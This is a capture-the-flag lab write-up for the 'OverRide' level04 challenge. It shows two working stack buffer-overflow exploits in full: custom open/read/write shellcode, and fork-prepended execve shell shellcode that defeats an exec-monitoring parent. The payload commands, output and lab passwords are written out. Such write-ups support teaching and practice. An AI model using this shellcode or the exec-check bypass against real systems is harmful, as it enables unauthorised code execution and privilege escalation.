# Level level04

## how to login

username: level04

password: kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf

## Goal

read `.pass` as user `level05`

## Actually doing something

Maix's approach:

When looking at the code, it become clear that we can do a buffer overflow and execute a shellcode (since there is a `gets` call)

But there is a whole machinery that just kill the process (well child process) if there is a call to any `exec` syscall

So I did the thing that is logicall, but weird in this case. I made a payload that didnt use any exec code, it just opens the file, readsit and prints it.

```asm
; nasm -pie -f elf32 -o out.o

_start:
	; this is how we get a string "OPQRKLMNGHIJCDEF89AB4567123"
    ; we want to push             "/home/users/level05/.pass\0" to the stack
    push 0x00000073; "s\0\0\0"
    push ".pas"
    push "l04/"
    push "leve"
    push "ers/"
    push "e/us"
    push "/hom"

    ; open(filename, 0, 0)
    mov eax, 5
    xor ecx, ecx
    xor edx, edx
    mov ebx, esp
    int	0x80

    ; read(fd, buffer, 100)
    mov ebx, eax
    mov eax, 3
    mov ecx, esp
    mov edx, 100
    int	0x80
    
    ; ret = read(fd, buffer, 100)
    mov ebx, 1
    mov edx, eax
    mov eax, 4
    mov ecx, esp
    int	0x80
    
    ; write(1, buffer, ret)
    xor ebx, ebx
    xor eax, eax
    inc eax
    int	0x80
```

we then use `objdump -s ./out.o` to get the raw bytes, and there is a `makepayload` which take the raw hex string and adds the `\x` to it

After a bit of fiddling, we get that the correct offset for the return address is `128 + 7*4`. My buffer is 128 bytes, and there are some other stuff in the stack, so it makes sense

Here is the final payload:

```bash
level04@OverRide:~$ env -i PWD=/home/users/level04 SHLVL=0 ~/level04 < <(python -c "print('\x6a\x73\x68\x2e\x70\x61\x73\x68\x6c\x30\x35\x2f\x68\x6c\x65\x76\x65\x68\x65\x72\x73\x2f\x68\x65\x2f\x75\x73\x68\x2f\x68\x6f\x6d\xb8\x05\x00\x00\x00\x31\xc9\x31\xd2\x89\xe3\xcd\x80\x89\xc3\xb8\x03\x00\x00\x00\x89\xe1\xba\x64\x00\x00\x00\xcd\x80\xbb\x01\x00\x00\x00\x89\xc2\xb8\x04\x00\x00\x00\x89\xe1\xcd\x80\x31\xdb\x31\xc0\x40\xcd\x80' + 'A' * (128-84+7*4) + '\xa0\xdd\xff\xff')")
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
child is exiting...
```

The password is printed :D

EMol's approach:

First we find the offset at which the buffer overflow segfault occurs (because of course there is a segfault).

To see more stuff about how our children are doing (i.e. either dying or segfaulting at specific addresses), we can use `set follow-fork-mode child`.

Then address of the buffer itself so that we can overwrite the return address with said address when the `strcpy` buffer overflow occurs (do something like `b *<address of call to gets>` followed by `x/20dx $esp`), business as usual, using python to generate a string with `payload + padding + return address`.

The trick here is that prepending fork to our usual shellcode allows us to bypass the original code's 'no exec' check since it only monitors the pid from the first fork.


```bash
level04@OverRide:~$ cat <(python -c 'print("\x31\xc0\xb0\x02\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "a" * (128 - 34) + "b" * 4 * 7 + "\xa0\xdd\xff\xff" )') - | env -i PWD=$HOME SHLVL=0 ~/level04
Give me some shellcode, k
no exec() for you
id
uid=1004(level04) gid=1004(level04) euid=1005(level05) egid=100(users) groups=1005(level05),100(users),1004(level04)
cat ~level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
